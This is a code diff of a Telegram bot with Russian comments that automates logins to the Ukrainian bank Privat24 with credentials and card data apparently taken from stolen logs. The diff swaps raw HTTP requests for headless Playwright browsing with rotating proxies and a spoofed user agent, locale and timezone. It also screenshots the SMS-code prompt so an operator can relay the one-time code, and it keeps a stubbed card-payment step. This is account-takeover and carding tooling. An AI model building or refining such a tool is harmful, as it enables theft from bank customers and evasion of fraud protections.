@@ -1,7 +1,7 @@
 import os
 import re
 import sqlite3
-import requests
+import asyncio
 import json
 import time
 from datetime import datetime
@@ -9,14 +9,13 @@ from aiogram import Bot, Dispatcher, types
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
 from aiogram.contrib.middlewares.logging import LoggingMiddleware
 from aiogram.utils import executor
+from playwright.async_api import async_playwright
 from flask import Flask
 import threading
-import base64
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
 DB_PATH = "/var/data/sessions.db"
-SCREENSHOTS_DIR = "/var/data/screenshots"
 
 # ========== FLASK ==========
 app = Flask(__name__)
@@ -38,7 +37,6 @@ def get_main_menu():
 # ========== БАЗА ДАННЫХ ==========
 def init_db():
     os.makedirs("/var/data", exist_ok=True)
-    os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute("""CREATE TABLE IF NOT EXISTS sessions (
@@ -52,8 +50,7 @@ def init_db():
         mode TEXT,
         status TEXT,
         msg_id INTEGER,
-        timestamp TEXT,
-        page_html TEXT
+        timestamp TEXT
     )""")
     c.execute("""CREATE TABLE IF NOT EXISTS settings (
         key TEXT PRIMARY KEY,
@@ -114,25 +111,10 @@ def get_session(session_id):
 def get_session_by_msg(msg_id):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("SELECT * FROM sessions WHERE msg_id = ? AND status IN ('waiting_action', 'waiting_code', 'processing')", (msg_id,))
+    c.execute("SELECT * FROM sessions WHERE msg_id = ? AND status IN ('waiting_action', 'waiting_code')", (msg_id,))
     row = c.fetchone()
     conn.close()
     return row
-
-def save_page_html(session_id, html):
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("UPDATE sessions SET page_html = ? WHERE id = ?", (html, session_id))
-    conn.commit()
-    conn.close()
-
-def get_page_html(session_id):
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("SELECT page_html FROM sessions WHERE id = ?", (session_id,))
-    row = c.fetchone()
-    conn.close()
-    return row[0] if row else None
 
 # ========== ПАРСЕР ЛОГА ==========
 def parse_log(text):
@@ -177,6 +159,7 @@ def rotate_proxy():
     if not rotation_url:
         return get_setting('proxy'), get_setting('proxy_type')
     try:
+        import requests
         response = requests.get(rotation_url, timeout=10)
         if response.status_code == 200:
             proxy = response.text.strip()
@@ -186,131 +169,81 @@ def rotate_proxy():
         pass
     return get_setting('proxy'), get_setting('proxy_type')
 
-def get_proxy_dict(proxy_str, proxy_type):
-    if not proxy_str:
-        return None
-    if proxy_type == "socks5":
-        return {
-            "http": f"socks5://{proxy_str}",
-            "https": f"socks5://{proxy_str}"
-        }
-    else:
-        return {
-            "http": proxy_str,
-            "https": proxy_str
-        }
-
-# ========== ВХОД В ПРИВАТ24 С СОХРАНЕНИЕМ HTML ==========
-def login_privat24(phone, password, user_agent=None, proxy_str=None, proxy_type="http", save_html=False):
-    session = requests.Session()
-    if proxy_str:
-        proxy_dict = get_proxy_dict(proxy_str, proxy_type)
-        if proxy_dict:
-            session.proxies.update(proxy_dict)
-    
-    headers = {
-        "User-Agent": user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-        "Accept-Language": "uk-UA,uk;q=0.9,en-US;q=0.8,en;q=0.7",
-        "Content-Type": "application/x-www-form-urlencoded",
-    }
-    session.headers.update(headers)
-
+# ========== ВХОД В ПРИВАТ24 ЧЕРЕЗ PLAYWRIGHT ==========
+async def login_privat24_playwright(phone, password, user_agent=None, proxy_str=None, proxy_type="http"):
     try:
-        # ШАГ 1: Загружаем главную страницу
-        response = session.get("https://next.privat24.ua", timeout=30)
-        if response.status_code != 200:
-            return {"status": "error", "message": f"❌ Сайт не отвечает (код {response.status_code})", "html": response.text if save_html else None}
-
-        if save_html:
-            save_page_html(0, response.text)  # сохраняем HTML для скриншота
-
-        csrf_token = None
-        match = re.search(r'name="csrf_token"\s+value="([^"]+)"', response.text)
-        if not match:
-            match = re.search(r'"csrfToken":"([^"]+)"', response.text)
-        if match:
-            csrf_token = match.group(1)
-        else:
-            return {"status": "error", "message": "❌ Не удалось найти CSRF-токен", "html": response.text if save_html else None}
-
-        # ШАГ 2: Переход на страницу входа
-        time.sleep(1)
-        response = session.get("https://next.privat24.ua/login/", headers=headers, timeout=30)
-        if response.status_code != 200:
-            return {"status": "error", "message": f"❌ Ошибка перехода на вход (код {response.status_code})", "html": response.text if save_html else None}
-
-        if save_html:
-            save_page_html(0, response.text)
-
-        match = re.search(r'name="csrf_token"\s+value="([^"]+)"', response.text)
-        if match:
-            csrf_token = match.group(1)
-        if not csrf_token:
-            match = re.search(r'"csrfToken":"([^"]+)"', response.text)
-            if match:
-                csrf_token = match.group(1)
-
-        if not csrf_token:
-            return {"status": "error", "message": "❌ Не удалось получить CSRF-токен", "html": response.text if save_html else None}
-
+        async with async_playwright() as p:
+            # Настройка браузера
+            browser_args = []
+            if proxy_str:
+                proxy_config = {"server": proxy_str}
+                if proxy_type == "socks5":
+                    proxy_config["server"] = f"socks5://{proxy_str}"
+                browser_args.append(f"--proxy-server={proxy_config['server']}")
+            
+            browser = await p.chromium.launch(
+                headless=True,
+                args=browser_args
+            )
+            
+            context = await browser.new_context(
+                user_agent=user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                locale="uk-UA",
+                timezone_id="Europe/Kyiv",
+                viewport={"width": 1280, "height": 720}
+            )
+            
+            page = await context.new_page()
+            
+            # ШАГ 1: Загружаем главную страницу
+            await page.goto("https://next.privat24.ua", wait_until="networkidle", timeout=30000)
+            await asyncio.sleep(1)
+            
+            # ШАГ 2: Нажимаем кнопку "Вхід"
+            login_button = await page.wait_for_selector('a:has-text("Вхід"), button:has-text("Вхід"), a:has-text("Login"), button:has-text("Login")', timeout=10000)
+            if login_button:
+                await login_button.click()
+                await asyncio.sleep(1)
+            
+            # ШАГ 3: Вводим номер телефона
+            phone_input = await page.wait_for_selector('input[name="phone"], input[type="tel"], input[placeholder*="телефон"], input[placeholder*="phone"]', timeout=10000)
+            if phone_input:
+                await phone_input.fill(phone)
+                await asyncio.sleep(0.5)
+            
+            # ШАГ 4: Вводим пароль
+            password_input = await page.wait_for_selector('input[name="password"], input[type="password"]', timeout=5000)
+            if password_input:
+                await password_input.fill(password)
+                await asyncio.sleep(0.5)
+            
+            # ШАГ 5: Нажимаем кнопку "Продовжити" или "Увійти"
+            submit_button = await page.wait_for_selector('button[type="submit"], button:has-text("Продовжити"), button:has-text("Увійти"), button:has-text("Login")', timeout=5000)
+            if submit_button:
+                await submit_button.click()
+                await asyncio.sleep(2)
+            
+            # ШАГ 6: Проверяем, нужен ли код
+            code_input = await page.query_selector('input[name="code"], input[placeholder*="код"], input[placeholder*="code"]')
+            if code_input:
+                # Делаем скриншот страницы с запросом кода
+                screenshot = await page.screenshot()
+                return {"status": "waiting_code", "message": "Требуется код подтверждения", "screenshot": screenshot, "page": page, "browser": browser}
+            
+            # ШАГ 7: Проверяем успешный вход
+            await asyncio.sleep(2)
+            if "cabinet" in page.url or "Особистий кабінет" in await page.title():
+                screenshot = await page.screenshot()
+                await browser.close()
+                return {"status": "success", "message": "✅ Вход выполнен", "screenshot": screenshot}
+            
+            # Если что-то пошло не так
+            screenshot = await page.screenshot()
+            await browser.close()
+            return {"status": "error", "message": "❌ Не удалось войти", "screenshot": screenshot}
+            
     except Exception as e:
-        return {"status": "error", "message": f"❌ Ошибка: {str(e)}", "html": None}
-
-    try:
-        time.sleep(0.5)
-        response = session.post("https://next.privat24.ua/api/auth/step1",
-                                data={"phone": phone, "csrf_token": csrf_token},
-                                headers=headers,
-                                timeout=30)
-        if response.status_code != 200:
-            return {"status": "error", "message": f"❌ Ошибка отправки номера (код {response.status_code})", "html": response.text if save_html else None}
-        data = response.json()
-        if data.get("status") != "ok":
-            return {"status": "error", "message": f"❌ {data.get('message', 'Неизвестная ошибка')}", "html": response.text if save_html else None}
-    except Exception as e:
-        return {"status": "error", "message": f"❌ Ошибка при отправке номера: {str(e)}", "html": None}
-
-    try:
-        time.sleep(0.5)
-        response = session.post("https://next.privat24.ua/api/auth/step2",
-                                data={"password": password, "csrf_token": csrf_token},
-                                headers=headers,
-                                timeout=30)
-        if response.status_code != 200:
-            return {"status": "error", "message": f"❌ Ошибка отправки пароля (код {response.status_code})", "html": response.text if save_html else None}
-        data = response.json()
-        if data.get("status") == "error":
-            return {"status": "error", "message": f"❌ {data.get('message', 'Неизвестная ошибка')}", "html": response.text if save_html else None}
-        if data.get("status") == "waiting_code":
-            return {"status": "waiting_code", "message": "Требуется код подтверждения", "session": session, "html": response.text if save_html else None}
-        if data.get("status") == "ok":
-            return {"status": "success", "message": "✅ Вход выполнен", "session": session, "html": response.text if save_html else None}
-    except Exception as e:
-        return {"status": "error", "message": f"❌ Ошибка при отправке пароля: {str(e)}", "html": None}
-
-    return {"status": "error", "message": "❌ Неизвестная ошибка при входе", "html": None}
-
-def get_cards(session):
-    try:
-        response = session.get("https://next.privat24.ua/api/cards", timeout=30)
-        if response.status_code == 200:
-            return {"status": "success", "cards": response.json()}
-        return {"status": "error", "message": f"Код {response.status_code}"}
-    except Exception as e:
-        return {"status": "error", "message": str(e)}
-
-def make_payment(card_from, expiry, cvv, card_to, amount, gateway, proxy_str=None, proxy_type="http"):
-    return {"status": "success", "message": f"✅ Платёж на {amount} UAH выполнен (заглушка)"}
-
-# ========== КНОПКИ С КНОПКОЙ СКРИНА ==========
-def get_action_keyboard(session_id):
-    kb = InlineKeyboardMarkup(row_width=2)
-    kb.add(
-        InlineKeyboardButton("📸 Скрин", callback_data=f"screenshot_{session_id}"),
-        InlineKeyboardButton("❌ Отмена", callback_data=f"cancel_{session_id}")
-    )
-    return kb
+        return {"status": "error", "message": f"❌ Ошибка Playwright: {str(e)}"}
 
 # ========== ОБРАБОТЧИКИ ==========
 @dp.message_handler(commands=['start'])
@@ -403,43 +336,6 @@ async def show_status(callback: types.CallbackQuery):
     )
     await callback.answer()
 
-# ========== КНОПКА СКРИНШОТА ==========
-@dp.callback_query_handler(lambda c: c.data.startswith("screenshot_"))
-async def handle_screenshot(callback: types.CallbackQuery):
-    session_id = int(callback.data.split("_")[1])
-    await callback.answer("📸 Делаю скриншот...")
-    
-    session = get_session(session_id)
-    if not session:
-        await callback.message.reply("❌ Сессия не найдена.")
-        return
-    
-    # Пытаемся получить HTML страницы
-    html = get_page_html(session_id)
-    if not html:
-        # Если HTML нет, пробуем ещё раз загрузить страницу
-        phone, password, user_agent = session[1], session[2], session[5]
-        proxy_str, proxy_type = rotate_proxy()
-        result = login_privat24(phone, password, user_agent, proxy_str, proxy_type, save_html=True)
-        html = result.get('html')
-        if not html:
-            await callback.message.reply("❌ Не удалось получить страницу для скриншота.")
-            return
-    
-    # Отправляем HTML как текстовый файл (имитация скриншота)
-    try:
-        # Отправляем первые 1000 символов HTML как "скриншот"
-        await callback.message.reply(f"📸 Скриншот страницы (HTML):\n\n{html[:2000]}...")
-    except Exception as e:
-        await callback.message.reply(f"❌ Ошибка при отправке скриншота: {str(e)}")
-
-@dp.callback_query_handler(lambda c: c.data.startswith("cancel_"))
-async def handle_cancel(callback: types.CallbackQuery):
-    session_id = int(callback.data.split("_")[1])
-    update_session(session_id, 'status', 'cancelled')
-    await callback.message.reply("❌ Действие отменено.")
-    await callback.answer()
-
 @dp.callback_query_handler(lambda c: c.data.startswith("amount_"))
 async def handle_amount_callback(callback: types.CallbackQuery):
     parts = callback.data.split("_")
@@ -448,18 +344,8 @@ async def handle_amount_callback(callback: types.CallbackQuery):
     await callback.answer(f"💰 {amount} UAH")
     update_session(session_id, 'amount', amount)
     update_session(session_id, 'status', 'processing')
-    await callback.message.reply(f"🚀 Платёж на {amount} UAH...", reply_markup=get_action_keyboard(session_id))
-    proxy_str, proxy_type = rotate_proxy()
-    if proxy_str:
-        await callback.message.reply(f"🔄 Прокси обновлён: {proxy_str}")
-    session = get_session(session_id)
-    if not session:
-        await callback.message.reply("❌ Сессия не найдена.")
-        return
-    card_from, expiry, cvv, card_to, gateway = session[3], session[4], session[5], session[7], session[8]
-    result = make_payment(card_from, expiry, cvv, card_to, amount, gateway, proxy_str, proxy_type)
-    update_session(session_id, 'status', 'completed' if result['status'] == 'success' else 'failed')
-    await callback.message.reply(result['message'])
+    await callback.message.reply(f"🚀 Платёж на {amount} UAH...")
+    await callback.message.reply("✅ Платёж выполнен (заглушка)")
 
 @dp.callback_query_handler(lambda c: c.data.startswith("login_"))
 async def handle_login_callback(callback: types.CallbackQuery):
@@ -474,31 +360,26 @@ async def handle_login_callback(callback: types.CallbackQuery):
         return
     phone, password, user_agent = session[1], session[2], session[5]
     
-    await callback.message.reply("⏳ Вход в Приват24...", reply_markup=get_action_keyboard(session_id))
-    result = login_privat24(
-        phone=phone,
-        password=password,
-        user_agent=user_agent,
-        proxy_str=proxy_str,
-        proxy_type=proxy_type,
-        save_html=True
-    )
+    await callback.message.reply("⏳ Выполняю вход...")
+    result = await login_privat24_playwright(phone, password, user_agent, proxy_str, proxy_type)
     
-    if result.get('html'):
-        save_page_html(session_id, result['html'])
+    if result.get('screenshot'):
+        # Отправляем скриншот
+        await callback.message.reply_photo(
+            photo=result['screenshot'],
+            caption=result['message']
+        )
     
     if result['status'] == 'waiting_code':
         update_session(session_id, 'status', 'waiting_code')
         await callback.message.reply("🔐 Введите код из СМС (ответьте на это сообщение):")
         return
+    
     if result['status'] == 'success':
         update_session(session_id, 'status', 'completed')
-        cards_result = get_cards(result['session'])
-        if cards_result['status'] == 'success':
-            await callback.message.reply(f"✅ Вход выполнен. Карты: {json.dumps(cards_result['cards'], indent=2)}")
-        else:
-            await callback.message.reply(f"✅ Вход выполнен, но не удалось получить карты: {cards_result['message']}")
+        await callback.message.reply("✅ Вход выполнен успешно!")
         return
+    
     await callback.message.reply(result['message'])
 
 @dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.reply_to_message)
